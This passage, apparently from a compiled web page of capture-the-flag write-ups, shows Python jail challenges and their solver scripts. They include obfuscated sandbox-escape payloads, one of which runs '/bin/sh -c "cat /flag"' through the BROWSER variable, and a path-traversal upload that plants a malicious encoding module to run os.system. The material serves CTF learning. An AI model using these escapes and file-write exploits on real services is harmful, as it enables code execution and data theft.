m <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> m<span class="token punctuation">]</span>
m <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

mapping <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"g"</span><span class="token punctuation">,</span>
    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"t"</span><span class="token punctuation">,</span>
    <span class="token number">32</span><span class="token punctuation">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span>
    <span class="token number">91</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+g+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'e'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

payload <span class="token operator">=</span> <span class="token string">'f"&#123;(f:=(t:=(g:=+(()==()))+g)*t*t*t*t+g+g)+t*t*(t+g):c&#125;&#123;(c:=(f*t+t*t*t*t+t*t*t+t+g)):c&#125;&#123;c:c&#125;&#123;c+t+t:c&#125;'</span>
payload <span class="token operator">=</span> <span class="token string">'f"&#123;(c:=(f:=(t:=(g:=+(()==()))+g)*t*t*t*t)*t+t*t*t*t+t*t*t+t+g):c&#125;&#123;c+t+t+t:c&#125;&#123;f:c&#125;'</span>

whitelist <span class="token operator">=</span> <span class="token triple-quoted-string string">"""gctf&#123;"*+*(=>:/)*+*"&#125;"""</span>
<span class="token comment"># generate payload</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> m<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">in</span> whitelist<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#123;"</span> <span class="token keyword">or</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> mapping<span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> <span class="token string">"&#123;c:c&#125;"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> <span class="token string">"&#123;%s:c&#125;"</span> <span class="token operator">%</span> mapping<span class="token punctuation">[</span>c<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token string">'"'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># verify payload is the same</span></code>`,Al,fn,Bp,Ii,Ol,mn,Yo,Go,ji,Fl,bn,g2=`<code class="language-py"><span class="token keyword">import</span> sys
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This is a safe calculator"</span><span class="token punctuation">)</span>
inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Formula: "</span><span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

blacklist <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."</span>
<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>x <span class="token keyword">in</span> inp <span class="token keyword">for</span> x <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nice try"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

fns <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">"setattr"</span><span class="token punctuation">:</span> <span class="token builtin">setattr</span><span class="token punctuation">,</span> <span class="token string">"__import__"</span><span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">,</span> <span class="token string">"chr"</span><span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> fns<span class="token punctuation">,</span> fns<span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,Rl,yn,Vo,$o,Ni,Dl,gn,w2=`<code class="language-py"><span class="token comment"># [setattr(__import__('os'), 'environ', &#123;'BROWSER': '/bin/sh -c "cat /flag" #%s'&#125;), __import__('antigravity')]</span>
<span class="token punctuation">[</span>\u{1D634}\u{1D626}\u{1D635}\u{1D622}\u{1D635}\u{1D635}\u{1D633}<span class="token punctuation">(</span>__\u{1D62A}\u{1D62E}\u{1D631}\u{1D630}\u{1D633}\u{1D635}__<span class="token punctuation">(</span><span class="token string">'\\157\\163'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\\145\\156\\166\\151\\162\\157\\156'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'\\102\\122\\117\\127\\123\\105\\122'</span><span class="token punctuation">:</span><span class="token string">'\\57\\142\\151\\156\\57\\163\\150\\40\\55\\143\\40\\42\\143\\141\\164\\40\\57\\146\\154\\141\\147\\42\\40\\43\\45\\163'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> __\u{1D62A}\u{1D62E}\u{1D631}\u{1D630}\u{1D633}\u{1D635}__<span class="token punctuation">(</span><span class="token string">'\\141\\156\\164\\151\\147\\162\\141\\166\\151\\164\\171'</span><span class="token punctuation">)</span><span class="token punctuation">]</span></code>`,Il,wn,Sp,Pi,jl,vn,Jo,Ko,Hi,Nl,En,v2=`<code class="language-py"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> send_from_directory
<span class="token keyword">import</span> dis
<span class="token keyword">import</span> io
<span class="token keyword">import</span> contextlib
<span class="token keyword">import</span> os
<span class="token keyword">import</span> datetime
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/report/&lt;path:filename>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">serve_reports</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'./reports/'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">del</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span>
    res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>
    <span class="token keyword">return</span> res

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">disassemble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    report_name <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>filename
    source <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'./reports/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/report/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span>
    report <span class="token operator">=</span> io<span class="token punctuation">.</span>StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> contextlib<span class="token punctuation">.</span>redirect_stdout<span class="token punctuation">(</span>report<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Report for'</span><span class="token punctuation">,</span> report_name<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Report date:'</span><span class="token punctuation">,</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            code <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token string">'&lt;string>'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span>
            dis<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
        <span class="token keyword">except</span> SyntaxError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Source code:'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./reports/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        width <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> report<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> report<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            line <span class="token operator">=</span> line<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>width<span class="token punctuation">)</span> <span class="token keyword">if</span> line <span class="token operator">!=</span> <span class="token string">'-'</span> <span class="token keyword">else</span> <span class="token string">'-'</span> <span class="token operator">*</span> width
            <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'# '</span> <span class="token operator">+</span> line <span class="token operator">+</span> <span class="token string">' #&#92;n'</span><span class="token punctuation">)</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>source<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/report/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span></code>`,Pl,hn,Zo,Xo,Ui,Hl,xn,E2=`<code class="language-py"><span class="token comment"># @null</span>
<span class="token keyword">import</span> requests
<span class="token comment"># target = 'http://localhost:1337/'</span>
target <span class="token operator">=</span> <span class="token string">'http://io.ept.gg:42256/'</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">b'''import os
os.system('cp /flag*.txt /app/reports/flag.txt')'''</span>

<span class="token comment"># Upload payload to /usr/local/lib/python3.12/encodings/fefe.py</span>
files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'source'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'../../usr/local/lib/python3.12/encodings/fefe.py'</span><span class="token punctuation">,</span> payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token comment"># When running or compiling python files that use the fefe encoding will now trigger our payload</span>
files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'source'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'fefe.py'</span><span class="token punctuation">,</span> <span class="token string">b'# encoding: fefe'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment"># trigger payload</span>
<span class="token comment"># Read flag</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/report/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code>`,Ul,Cn,qp,Mi,Ml,Ln,Qo,se,Bi,Bl,Tn,h2=`<code class="language-py"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#</span>
    x <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"palindrome? "</span><span class="token punctuation">)</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token string">"#"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> x<span class="token punctuation">,</span> <span class="token string">"comments are bad"</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ascii only kthx"</span><span class="token comment">#</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> x <span class="token operator">==</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"not a palindrome"</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token string">"palindromes can't be more than 35 characters long, this is a well known fact."</span><span class="token comment">#</span>
    <span class="token comment">#assert sum(x.encode()) % 256 == 69, "not nice!"#</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment">#)x(lave</span>
<span class="token comment">#"!ecin ton" ,96 == 652 % ))(edocne.x(mus tressa</span>
<span class="token comment">#".tcaf nwonk llew a si siht ,gnol sretcarahc 53 naht erom eb t'nac semordnilap" ,63 &lt; )x(nel tressa</span>
<span class="token comment">#"emordnilap a ton" ,]1-::[x == x tressa</span>
<span class="token comment">#"xhtk ylno iicsa" ,)x ni i rof 821 &lt; )i(dro(lla tressa</span>
<span class="token comment">#"dab era stnemmoc" ,x ni ton "#" tressa</span>
<span class="token comment">#)" ?emordnilap"(tupni = x</span>
<span class="token comment">#:eurT elihw</span></code>`,Sl,An,ne,ae,Si,ql,On,x2=`<code class="language-py"><span class="token comment"># setting up template for generating palindromes</span>
alph <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstvwyzABCDEFGHIJKLMNOPQRSTVWYZ1234567890!\\"</span><span class="token comment">#\xA4%&amp;/()=?@$\u20AC&#123;[]&#125;"</span>
dd <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',)"CHAR"=:VAR1(,',(VAR1:="CHAR"),'\\START'"""</span>
ff <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',)"CHAR"+VAR2=:VAR1(,',(VAR1:=VAR2+"CHAR"),'\\START'"""</span>
gg <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',))VAR1(lave(,',(eval(VAR1)),'\\START'"""</span>
ch <span class="token operator">=</span> <span class="token punctuation">[</span>dd<span class="token punctuation">,</span>ff<span class="token punctuation">,</span>gg<span class="token punctuation">]</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""eval(input());"""</span>
out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

var <span class="token operator">=</span> var2 <span class="token operator">=</span> <span class="token string">"C"</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span>char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    found <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token comment"># some dumb manual fixes</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"a"</span>
        var2 <span class="token operator">=</span> <span class="token string">"C"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"C"</span>
        var2 <span class="token operator">=</span> <span class="token string">"a"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"b"</span>
        var2 <span class="token operator">=</span> <span class="token string">"C"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"b"</span>
        var2 <span class="token operator">=</span> <span class="token string">"b"</span>
    <span class="token comment"># brute char</span>
    <span class="token keyword">for</span> brute <span class="token keyword">in</span> alph<span class="token punctuation">:</span>
        n <span class="token operator">=</span> ch<span class="token punctuation">[</span><span class="token number">1</span> <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span> <span class="token keyword">and</span> i<span class="token operator">!=</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span> <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"START"</span><span class="token punctuation">,</span>brute<span class="token punctuation">)</span>
        <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token string">"\\"</span>"<span class="token punctuation">:</span>
            char <span class="token operator">=</span> <span class="token string">"\\\\"</span><span class="token operator">+</span>char
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"CHAR"</span><span class="token punctuation">,</span>char<span class="token punctuation">)</span>
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"VAR1"</span><span class="token punctuation">,</span> var<span class="token punctuation">)</span>
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"VAR2"</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span>
        check <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token number">69</span> <span class="token keyword">and</span> n <span class="token operator">==</span> n<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span>
            found <span class="token operator">=</span> <span class="token boolean">True</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"COULDNT FIND VALID CHAR"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>

<span class="token comment"># verify payload works</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> p <span class="token keyword">in</span> out<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span>
